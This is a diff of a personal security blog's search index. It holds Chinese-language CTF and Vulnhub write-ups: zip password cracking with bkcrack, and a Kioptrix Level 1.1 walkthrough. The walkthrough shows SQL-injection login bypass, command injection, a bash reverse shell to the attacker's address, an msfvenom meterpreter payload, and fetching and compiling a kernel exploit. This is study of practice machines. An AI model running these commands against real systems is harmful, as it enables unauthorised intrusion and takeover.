@@ -1,114 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2023春秋杯_Misc</title>
-    <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
-    <content><![CDATA[<h1 id="谁偷了我的外卖"><a href="#谁偷了我的外卖" class="headerlink" title="谁偷了我的外卖"></a>谁偷了我的外卖</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
-<li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>拿到手是一张jpg</li>
-</ul>
-<img lazyload src="/images/loading.svg" data-src="2023春秋杯-Misc/小凯.jpg" alt="小凯" style="zoom:33%;">
-
-<ul>
-<li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160239092.png" alt="image-20240304160239092"></p>
-<ul>
-<li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li>
-<li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160712556.png" alt="image-20240304160712556"></p>
-<p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p>
-<ul>
-<li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li>
-</ul>
-<p><strong>能发现第一个少了四个字母</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161318875.png" alt="处理文件夹文件名称"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>先把第2个文件开始的提取出来</strong></p>
-<ul>
-<li>base64解码，可以在末尾发现应该是压缩包</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161819149.png" alt="image-20240304161819149"></p>
-<ul>
-<li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162516972.png" alt="image-20240304162516972"></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162720172.png" alt="image-20240304162720172"></p>
-<p><strong>成功拿到download.zip</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162046748.png" alt="image-20240304162046748"></p>
-<p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162147928.png" alt="image-20240304162147928"></p>
-<ul>
-<li>查看这两个文件<ul>
-<li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li>
-</ul>
-</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162805829.png" alt="image-20240304162805829"></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304163109001.png" alt="image-20240304163109001"></p>
-<ul>
-<li><p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p>
-</li>
-<li><p>用bkcrack明文爆破出密钥</p>
-</li>
-</ul>
-<p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164507564.png" alt="image-20240304164507564"></p>
-<p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p>
-<ul>
-<li>利用密钥破解</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure></div>
-
-<p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164738068.png" alt="image-20240304164738068"></p>
-<ul>
-<li>成功提取并打开txt.galf</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164841781.png" alt="image-20240304164841781"></p>
-<ul>
-<li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="明文混淆（复现）"><a href="#明文混淆（复现）" class="headerlink" title="明文混淆（复现）"></a>明文混淆（复现）</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
-<li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li>
-</ul>
-<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
-<li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203835579.png" alt="image-20240304203835579"></p>
-<ul>
-<li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203726863.png" alt="image-20240304203726863"></p>
-<p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p>
-<ul>
-<li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li>
-<li>bkcrack爆破</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211905788.png" alt="image-20240304211905788"></p>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211926934.png" alt="image-20240304211926934"></p>
-<ul>
-<li>提取出shell2.php，解混淆</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./image-20240304212121097.png" alt="image-20240304212121097"></p>
-<p><em>php解混淆知识有待加强:sob:</em></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-      <tags>
-        <tag>MISC-压缩包</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kioptrix Level 1.3(#4)</title>
     <url>/2024/03/05/Kioptrix-Level-1-3/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-1-3-4"><a href="#Kioptrix-Level-1-3-4" class="headerlink" title="Kioptrix Level 1.3(#4)"></a>Kioptrix Level 1.3(#4)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
@@ -227,6 +119,270 @@
 <p><a class="link" href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link" href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>类OSCP靶机练习</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023春秋杯_Misc</title>
+    <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
+    <content><![CDATA[<h1 id="谁偷了我的外卖"><a href="#谁偷了我的外卖" class="headerlink" title="谁偷了我的外卖"></a>谁偷了我的外卖</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
+<li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>拿到手是一张jpg</li>
+</ul>
+<img lazyload src="/images/loading.svg" data-src="2023春秋杯-Misc/小凯.jpg" alt="小凯" style="zoom:33%;">
+
+<ul>
+<li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160239092.png" alt="image-20240304160239092"></p>
+<ul>
+<li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li>
+<li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160712556.png" alt="image-20240304160712556"></p>
+<p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p>
+<ul>
+<li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li>
+</ul>
+<p><strong>能发现第一个少了四个字母</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161318875.png" alt="处理文件夹文件名称"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>先把第2个文件开始的提取出来</strong></p>
+<ul>
+<li>base64解码，可以在末尾发现应该是压缩包</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161819149.png" alt="image-20240304161819149"></p>
+<ul>
+<li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162516972.png" alt="image-20240304162516972"></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162720172.png" alt="image-20240304162720172"></p>
+<p><strong>成功拿到download.zip</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162046748.png" alt="image-20240304162046748"></p>
+<p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162147928.png" alt="image-20240304162147928"></p>
+<ul>
+<li>查看这两个文件<ul>
+<li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li>
+</ul>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162805829.png" alt="image-20240304162805829"></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304163109001.png" alt="image-20240304163109001"></p>
+<ul>
+<li><p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p>
+</li>
+<li><p>用bkcrack明文爆破出密钥</p>
+</li>
+</ul>
+<p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164507564.png" alt="image-20240304164507564"></p>
+<p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p>
+<ul>
+<li>利用密钥破解</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure></div>
+
+<p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164738068.png" alt="image-20240304164738068"></p>
+<ul>
+<li>成功提取并打开txt.galf</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164841781.png" alt="image-20240304164841781"></p>
+<ul>
+<li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="明文混淆（复现）"><a href="#明文混淆（复现）" class="headerlink" title="明文混淆（复现）"></a>明文混淆（复现）</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
+<li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li>
+</ul>
+<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
+<li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203835579.png" alt="image-20240304203835579"></p>
+<ul>
+<li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203726863.png" alt="image-20240304203726863"></p>
+<p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p>
+<ul>
+<li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li>
+<li>bkcrack爆破</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211905788.png" alt="image-20240304211905788"></p>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211926934.png" alt="image-20240304211926934"></p>
+<ul>
+<li>提取出shell2.php，解混淆</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240304212121097.png" alt="image-20240304212121097"></p>
+<p><em>php解混淆知识有待加强:sob:</em></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>MISC-压缩包</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 1.1(#2)</title>
+    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
+<p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
+<li>nmap扫描端口及端口服务</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>看到了web服务：80端口和443端口</strong></p>
+<ul>
+<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
+<ul>
+<li>F12 查看源代码</li>
+</ul>
+<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">
+
+<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
+<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
+<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
+<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
+</li>
+<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
+<ul>
+<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
+</ul>
+</li>
+<li><p>成功后看到以下页面：</p>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
+<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
+<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
+<ul>
+<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
+<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
+<p><strong>证明确实存在RCE</strong></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
+<p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
+<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
+</li>
+<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
+<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
+<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
+<p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<ul>
+<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
+<p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
+<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>
+
+<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
+<p><strong>发现Linux版本是CentOS 4.5</strong></p>
+<ul>
+<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
+</ul>
+<blockquote>
+<p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
+<li><code>searchsploit CentOS 4.5</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
+<ul>
+<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
+</ul>
+<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
+<ul>
+<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
+<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
+<ul>
+<li>同时在攻击机上也可以看到靶机的信息</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
+<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
+<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
+</li>
+<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
+</li>
+<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
+</li>
+<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
+</li>
+</ul>
+<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>
+
